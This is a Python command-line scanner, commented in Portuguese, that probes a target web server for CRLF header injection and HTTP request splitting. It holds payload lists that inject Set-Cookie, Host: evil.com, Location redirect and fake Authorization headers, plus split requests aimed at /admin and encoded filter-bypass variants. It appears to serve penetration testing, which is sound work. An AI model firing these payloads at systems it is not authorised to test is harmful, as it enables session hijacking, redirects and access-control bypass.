#!/usr/bin/env python3
"""Modulo de testes de CRLF Injection em HTTP.

Testa se o servidor e vulneravel a injecao de headers HTTP via CRLF (\r\n):
  - Headers HTTP (User-Agent, Referer, Cookie, X-Forwarded-For)
  - Parametros GET/POST com payloads CRLF
  - URL path com CRLF
  - HTTP Request Splitting (dois requests em um)
  - Bypass de filtros CRLF (encoding, double encode, null byte)

Fluxo:
  1. Envia requisicao baseline sem CRLF
  2. Envia requisicoes com CRLF em diferentes posicoes
  3. Compara respostas (status, tamanho, headers, corpo)
  4. Classifica cada tecnica: vulnerable, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import asyncio
import logging
from collections.abc import Awaitable
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.crlfinjection")

_CATEGORY_MAP: dict[str, list[str]] = {
    "param": ["get_crlf", "post_crlf", "json_crlf"],
    "header": ["ua_crlf", "referer_crlf", "cookie_crlf", "xff_crlf"],
    "path": ["path_crlf", "path_split"],
    "split": ["request_split", "response_split", "double_crlf"],
    "bypass": ["encoded_crlf", "double_encode", "nullbyte_crlf"],
}

_CRLF_PAYLOADS: list[tuple[str, str]] = [
    ("crlf_header", "\r\nX-Injected: test-crlf"),
    ("crlf_cookie", "\r\nSet-Cookie: evil=injected"),
    ("crlf_host", "\r\nHost: evil.com"),
    ("crlf_newline", "\r\n\r\n<h1>INJECTED</h1>"),
    ("crlf_body", "\r\nContent-Length: 0\r\n\r\n"),
    ("crlf_chunked", "\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
    ("crlf_auth", "\r\nAuthorization: Bypass token=1"),
    ("crlf_location", "\r\nLocation: http://evil.com"),
]

_SPLIT_PAYLOADS: list[tuple[str, str]] = [
    ("split_simple", "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>SPLIT</h1>"),
    ("split_admin", "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"),
    ("split_cookie", "POST /login HTTP/1.1\r\nHost: target\r\nCookie: admin=1\r\n\r\n"),
    ("split_double", "GET /ok HTTP/1.1\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"),
]

_ENCODED_PAYLOADS: list[tuple[str, str]] = [
    ("percent_0d0a", "%0d%0aX-Injected: test"),
    ("percent_0a", "%0aX-Injected: test"),
    ("percent_0d", "%0dX-Injected: test"),
    ("double_encoded", "%250d%250aX-Injected: test"),
    ("unicode_crlf", "\u000d\u000aX-Injected: test"),
    ("backslash_rn", "\\r\\nX-Injected: test"),
]

_SPLIT_POINTS: list[tuple[str, str, str]] = [
    ("url_path", "/%0d%0aX-Injected:%20test", "path"),
    ("query_param", "?q=%0d%0aX-Injected:%20test", "param"),
    ("fragment", "/#%0d%0aX-Injected:%20test", "path"),
    ("path_end", "/page%0d%0aX-Injected:%20test", "path"),
]

_HEADER_NAMES: list[str] = [
    "User-Agent",
    "Referer",
    "Cookie",
    "X-Forwarded-For",
    "Accept-Language",
    "X-Requested-With",
]


@dataclass(frozen=True, slots=True)
class CRLFAttempt:
    """Tentativa individual de CRLF injection."""

    technique: str
    category: str
    url: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    injected_headers: list[str]
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class CRLFResult:
    """Resultado consolidado do scan de CRLF injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[CRLFAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(
    client: httpx.AsyncClient, url: str,
) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _detect_injected_headers(body: bytes, headers: dict[str, str]) -> list[str]:
    """Detecta headers injetados na resposta."""
    injected: list[str] = []
    body_text = body.decode("utf-8", errors="ignore").lower()
    header_names = ["x-injected", "set-cookie", "host", "authorization", "location"]
    for h in header_names:
        if h in body_text:
            injected.append(h)
        if h in headers:
            injected.append(f"header:{h}")
    return injected


def _check_vulnerability(
    status_baseline: int,
    status_test: int,
    size_baseline: int,
    size_test: int,
    injected_headers: list[str],
) -> bool:
    """Determina se a tecnica e vulneravel."""
    status_changed = status_test != status_baseline
    size_changed = abs(size_test - size_baseline) > 50
    has_injection = len(injected_headers) > 0
    return status_changed or size_changed or has_injection


async def _test_param_crlf(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[CRLFAttempt]:
    """Testa CRLF injection em parametros GET/POST."""
    parsed = urlparse(base_url)
    original_params = parse_qs(parsed.query, keep_blank_values=True)
    attempts: list[CRLFAttempt] = []
    status_base, size_base, _ = baseline

    test_params = ["q", "search", "name", "redirect", "url", "page"]
    for param in test_params:
        for name, payload in _CRLF_PAYLOADS:
            new_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
            new_params[param] = f"test{payload}"
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                resp = await client.get(test_url, follow_redirects=False)
                status_test = resp.status_code
                size_test = len(resp.content)
                injected = _detect_injected_headers(resp.content, dict(resp.headers))
                vuln = _check_vulnerability(status_base, status_test, size_base, size_test, injected)
                attempts.append(CRLFAttempt(
                    technique=f"{name}_{param}",
                    category="param",
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    injected_headers=injected,
                    vulnerable=vuln,
                    details=f"Param {param}: {name}" + (f" -> {injected}" if injected else ""),
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(CRLFAttempt(
                    technique=f"{name}_{param}",
                    category="param",
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    injected_headers=[],
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                ))

    return attempts


async def _test_header_crlf(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[CRLFAttempt]:
    """Testa CRLF injection em headers HTTP."""
    attempts: list[CRLFAttempt] = []
    status_base, size_base, _ = baseline

    for header in _HEADER_NAMES:
        for name, payload in _CRLF_PAYLOADS[:4]:
            try:
                resp = await client.get(
                    base_url,
                    headers={header: f"test{payload}"},
                    follow_redirects=False,
                )
                status_test = resp.status_code
                size_test = len(resp.content)
                injected = _detect_injected_headers(resp.content, dict(resp.headers))
                vuln = _check_vulnerability(status_base, status_test, size_base, size_test, injected)
                attempts.append(CRLFAttempt(
                    technique=f"{name}_{header.lower().replace('-', '_')}",
                    category="header",
                    url=base_url,
                    payload=f"{header}: test{payload}",
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    injected_headers=injected,
                    vulnerable=vuln,
                    details=f"Header {header}: {name}" + (f" -> {injected}" if injected else ""),
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(CRLFAttempt(
                    technique=f"{name}_{header.lower().replace('-', '_')}",
                    category="header",
                    url=base_url,
                    payload=f"{header}: test{payload}",
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    injected_headers=[],
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                ))

    return attempts


async def _test_path_crlf(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[CRLFAttempt]:
    """Testa CRLF injection em URL path."""
    parsed = urlparse(base_url)
    attempts: list[CRLFAttempt] = []
    status_base, size_base, _ = baseline

    for point_name, point_payload, category in _SPLIT_POINTS:
        for name, payload in _CRLF_PAYLOADS[:4]:
            path = f"{parsed.path}{point_payload}"
            test_url = urlunparse(parsed._replace(path=path, query=""))

            try:
                resp = await client.get(test_url, follow_redirects=False)
                status_test = resp.status_code
                size_test = len(resp.content)
                injected = _detect_injected_headers(resp.content, dict(resp.headers))
                vuln = _check_vulnerability(status_base, status_test, size_base, size_test, injected)
                attempts.append(CRLFAttempt(
                    technique=f"{name}_{point_name}",
                    category=category,
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    injected_headers=injected,
                    vulnerable=vuln,
                    details=f"Path {point_name}: {name}" + (f" -> {injected}" if injected else ""),
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(CRLFAttempt(
                    technique=f"{name}_{point_name}",
                    category=category,
                    url=test_url,
                    payload=payload,
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    injected_headers=[],
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                ))

    return attempts


async def _test_split(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[CRLFAttempt]:
    """Testa HTTP Request Splitting via CRLF."""
    attempts: list[CRLFAttempt] = []
    status_base, size_base, _ = baseline

    for name, split_payload in _SPLIT_PAYLOADS:
        try:
            resp = await client.get(
                base_url,
                headers={"User-Agent": f"test{split_payload}"},
                follow_redirects=False,
            )
            status_test = resp.status_code
            size_test = len(resp.content)
            body_text = resp.content.decode("utf-8", errors="ignore")
            has_split = "SPLIT" in body_text or "admin" in body_text.lower()
            vuln = status_test != status_base or has_split
            attempts.append(CRLFAttempt(
                technique=f"split_{name}",
                category="split",
                url=base_url,
                payload=split_payload,
                status_baseline=status_base,
                status_test=status_test,
                size_baseline=size_base,
                size_test=size_test,
                status_changed=status_test != status_base,
                size_changed=abs(size_test - size_base) > 50,
                injected_headers=[],
                vulnerable=vuln,
                details=f"Split: {name}" + (" -> detected" if has_split else ""),
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(CRLFAttempt(
                technique=f"split_{name}",
                category="split",
                url=base_url,
                payload=split_payload,
                status_baseline=status_base,
                status_test=0,
                size_baseline=size_base,
                size_test=0,
                status_changed=False,
                size_changed=False,
                injected_headers=[],
                vulnerable=False,
                details="",
                error=str(exc)[:100],
            ))

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[CRLFAttempt]:
    """Testa bypass de filtros CRLF via encoding."""
    attempts: list[CRLFAttempt] = []
    status_base, size_base, _ = baseline

    for name, payload in _ENCODED_PAYLOADS:
        for header in _HEADER_NAMES[:3]:
            try:
                resp = await client.get(
                    base_url,
                    headers={header: f"test{payload}"},
                    follow_redirects=False,
                )
                status_test = resp.status_code
                size_test = len(resp.content)
                injected = _detect_injected_headers(resp.content, dict(resp.headers))
                vuln = _check_vulnerability(status_base, status_test, size_base, size_test, injected)
                attempts.append(CRLFAttempt(
                    technique=f"bypass_{name}_{header.lower().replace('-', '_')}",
                    category="bypass",
                    url=base_url,
                    payload=f"{header}: test{payload}",
                    status_baseline=status_base,
                    status_test=status_test,
                    size_baseline=size_base,
                    size_test=size_test,
                    status_changed=status_test != status_base,
                    size_changed=abs(size_test - size_base) > 50,
                    injected_headers=injected,
                    vulnerable=vuln,
                    details=f"Bypass {header}: {name}" + (f" -> {injected}" if injected else ""),
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(CRLFAttempt(
                    technique=f"bypass_{name}_{header.lower().replace('-', '_')}",
                    category="bypass",
                    url=base_url,
                    payload=f"{header}: test{payload}",
                    status_baseline=status_base,
                    status_test=0,
                    size_baseline=size_base,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    injected_headers=[],
                    vulnerable=False,
                    details="",
                    error=str(exc)[:100],
                ))

    return attempts


def print_results(result: CRLFResult) -> None:
    """Exibe resultados formatados."""
    tls_tag = color("[HTTPS]", Cyber.GREEN, Cyber.BOLD) if result.tls else color("[HTTP]", Cyber.YELLOW)
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  CRLF INJECTION SCANNER", Cyber.RED, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))
    print(color(f"  Alvo:       {result.target}", Cyber.CYAN))
    print(color(f"  TLS:        {tls_tag}", Cyber.WHITE))
    print(color(f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(color(f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD))
        for tech in vuln_techs:
            print(color(f"      [!] {tech}", Cyber.RED))
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(color("\n  [+] Nenhuma vulnerabilidade CRLF detectada", Cyber.GREEN, Cyber.BOLD))
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan CRLF injection."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout)

    print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
    baseline = await _test_baseline(client, target)
    if baseline[0] == 0:
        print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
        return 1

    print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

    run_categories = categories or list(_CATEGORY_MAP.keys())
    all_attempts: list[CRLFAttempt] = []

    tasks: list[Awaitable[list[CRLFAttempt]]] = []
    for cat in run_categories:
        if cat == "param":
            tasks.append(_test_param_crlf(client, target, baseline))
        elif cat == "header":
            tasks.append(_test_header_crlf(client, target, baseline))
        elif cat == "path":
            tasks.append(_test_path_crlf(client, target, baseline))
        elif cat == "split":
            tasks.append(_test_split(client, target, baseline))
        elif cat == "bypass":
            tasks.append(_test_bypass(client, target, baseline))

    if tasks:
        results_list = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results_list:
            if isinstance(r, list):
                all_attempts.extend(r)

    vuln = [a.technique for a in all_attempts if a.vulnerable]
    blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
    issues: list[str] = []
    for att in all_attempts:
        if att.vulnerable:
            issues.append(f"VULN: {att.technique} - {att.details}")
        if att.injected_headers:
            issues.append(f"INJECTED: {att.technique} -> {att.injected_headers}")

    overall = "vulnerable" if vuln else "secure"

    result = CRLFResult(
        target=target,
        baseline_status=baseline[0],
        baseline_size=baseline[1],
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vuln,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, asdict(result))

    logger.info("CRLF scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln))
    return 1 if vuln else 0


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-crlfinject",
        description="CRLF Injection — detecta injecao de headers via \\r\\n em HTTP",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument("-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def print_crlf_art() -> None:
    """Exibe ASCII art do scanner."""
    print(color(
        "\n  _____ _             _____      _       _             \n"
        " / ____| |           |  ___|    | |     | |            \n"
        "| |    | | __ _ _ __ | |_  _ __ | |_ ___| |_ ___ _ __ \n"
        "| |    | |/ _` | '_ \\|  _|| '__| __/ _ \\ __/ _ \\ '__|\n"
        "| |____| | (_| | |_) | |  | |  | ||  __/ ||  __/ |   \n"
        " \\_____|_|\\__,_| .__/\\_|  |_|   \\__\\___|\\__\\___|_|   \n"
        "               | |                                     \n"
        "               |_|                                     \n",
        Cyber.RED, Cyber.BOLD,
    ))


banner_art = create_banner(
    "\n  _____ _             _____      _       _             \n"
    " / ____| |           |  ___|    | |     | |            \n"
    "| |    | | __ _ _ __ | |_  _ __ | |_ ___| |_ ___ _ __ \n"
    "| |    | |/ _` | '_ \\|  _|| '__| __/ _ \\ __/ _ \\ '__|\n"
    "| |____| | (_| | |_) | |  | |  | ||  __/ ||  __/ |   \n"
    " \\_____|_|\\__,_| .__/\\_|  |_|   \\__\\___|\\__\\___|_|   \n"
    "               | |                                     \n"
    "               |_|                                     \n",
    "CRLF Injection — detecta injecao de headers via \\r\\n em HTTP",
)


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan CRLF injection a partir de argumentos parseados."""
    logger.info("CRLF Injection scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="crlf> ",
        description="CRLF Injection interativo.",
        example="https://target.com -c param",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c param\n"
            "  https://target.com -c header\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
